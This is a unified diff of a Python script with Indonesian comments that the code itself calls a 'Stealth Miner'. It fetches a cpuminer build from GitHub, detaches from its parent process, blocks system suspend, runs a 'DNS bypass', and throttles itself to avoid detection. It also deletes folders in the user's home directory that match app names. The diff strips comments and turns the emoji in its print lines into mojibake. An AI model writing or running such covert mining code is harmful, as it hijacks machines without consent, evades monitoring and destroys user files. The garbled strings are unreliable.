@@ -11,7 +11,6 @@ import sys
 import random
 import signal
 
-# === KONFIGURASI ===
 URL = "https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz"
 TARFILE = "miner.tar.gz"
 BIN_NAME = "cpuminer-sse2"
@@ -33,7 +32,6 @@ cooldown_restart_counter = 0
 cooldown_restart_limit = 3
 cooldown_reset_time = time.time() + 3600
 
-# === PROTEKSI PROSES ===
 def protect_process():
     try:
         if hasattr(os, 'setsid'):
@@ -44,7 +42,6 @@ def protect_process():
     except:
         pass
 
-# === ANTI SUSPEND ===
 def anti_suspend():
     while True:
         try:
@@ -54,7 +51,6 @@ def anti_suspend():
             pass
         time.sleep(15)
 
-# === DNS BYPASS ===
 def dns_doh_bypass():
     try:
         subprocess.call([
@@ -64,7 +60,6 @@ def dns_doh_bypass():
     except:
         pass
 
-# === CEK CPU ===
 def is_cpu_100_percent():
     try:
         load = os.getloadavg()[0]
@@ -73,10 +68,9 @@ def is_cpu_100_percent():
     except:
         return False
 
-# === CEK LOCKFILE ===
 def check_lock():
     if os.path.exists(LOCKFILE):
-        print("[🔒] Mining sudah aktif.")
+        print("[馃敀] Mining sudah aktif.")
         sys.exit(0)
     with open(LOCKFILE, "w") as f:
         f.write(str(os.getpid()))
@@ -100,18 +94,6 @@ def should_restart():
 
 def clean_explorer_myapp():
     home = os.path.expanduser("~")
-    patterns = [
-        "MyAppExplore", ".MyApp", ".Explore", "Downloads/MyApp",
-        ".local/share/myapp", ".local/share/MyApp", ".cache/myapp"
-    ]
-    for pattern in patterns:
-        target = os.path.join(home, pattern)
-        if os.path.exists(target):
-            try:
-                shutil.rmtree(target)
-                print(f"[🗑️] Hapus: {target}")
-            except:
-                pass
     for root, dirs, _ in os.walk(home):
         for d in dirs:
             if "myapp" in d.lower() or "explore" in d.lower():
@@ -153,7 +135,7 @@ def run_one_session():
     while time.time() - start_time < duration:
         time.sleep(10)
         if is_cpu_100_percent():
-            print("[⚠️] CPU 100%! Cooldown...")
+            print("[鈿狅笍] CPU 100%! Cooldown...")
             proc.terminate()
             try:
                 proc.wait(timeout=10)
@@ -174,13 +156,13 @@ def main_loop():
     while True:
         run_one_session()
         pause = random.randint(MIN_PAUSE, MAX_PAUSE)
-        print(f"[⏳] Pause {pause}s...
+        print(f"[鈴砞 Pause {pause}s...
 ")
         time.sleep(pause)
 
 def restart_script():
     try:
-        print("[🔁] Restart aman...")
+        print("[馃攣] Restart aman...")
         clean_miner_cache()
         clean_explorer_myapp()
         time.sleep(1.5)
@@ -191,7 +173,7 @@ def restart_script():
 
 if __name__ == "__main__":
     check_lock()
-    print("⛏️  Stealth Miner Aktif: Proteksi + Restart + Cooldown")
+    print("鉀忥笍  Stealth Miner Aktif: Proteksi + Restart + Cooldown")
     threading.Thread(target=anti_suspend, daemon=True).start()
     threading.Thread(target=dns_doh_bypass, daemon=True).start()
     clean_explorer_myapp()
